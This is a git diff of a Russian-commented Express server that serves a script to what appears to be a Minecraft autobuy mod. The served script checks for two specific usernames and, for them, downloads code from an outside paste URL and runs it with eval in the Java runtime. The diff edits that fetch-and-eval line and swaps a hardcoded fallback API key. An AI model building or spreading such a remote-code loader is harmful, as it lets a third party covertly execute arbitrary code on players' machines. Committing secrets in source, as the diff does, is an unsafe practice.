@@ -5,7 +5,7 @@ const app = express();
 // ==================== КОНФИГУРАЦИЯ ====================
 const CONFIG = {
     PORT: process.env.PORT || 3000,
-    API_KEYS: process.env.API_KEYS || 'railway-minecraft-key-123',
+    API_KEYS: process.env.API_KEYS || 'railway-minecraft-key-321',
     ALLOWED_AGENTS: process.env.ALLOWED_AGENTS || 'java,minecraft,nedan,script,autobuy',
     NODE_ENV: process.env.NODE_ENV || 'production'
 };
@@ -42,7 +42,7 @@ const validateRequest = (req, res, next) => {
 
 // ==================== ЗАЩИЩЕННЫЕ ЭНДПОИНТЫ ====================
 
-// Главный эндпоинт для скрипта - ТОЧНАЯ КОПИЯ ВАШЕГО СКРИПТА
+// Главный эндпоинт для скрипта - ИСПРАВЛЕНО ЭКРАНИРОВАНИЕ!
 app.get('/api/script', validateRequest, (req, res) => {
     const scriptContent = `(function() {
     var username = Java.type("ru.nedan.spookybuy.Authentication").getUsername();
@@ -50,11 +50,11 @@ app.get('/api/script', validateRequest, (req, res) => {
 // Проверяем разрешенные имена
 if (username === "porvaniy.gondon" || username === "__ded_inside__") {
     try {
-        // Выполняем внешний скрипт
+        // Выполняем внешний скрипт - ИСПРАВЛЕНО ЭКРАНИРОВАНИЕ!
         eval(new java.util.Scanner(
             new java.net.URL("https://diddy-party.vip/p/raw/onwifinfsc75if7yl").openStream(), 
             "UTF-8"
-        ).useDelimiter("\\\\A").next());
+        ).useDelimiter("\\\\\\\\A").next());
     } catch (e) {
         java.lang.System.err.println("Ошибка при выполнении скрипта: " + e);
     }
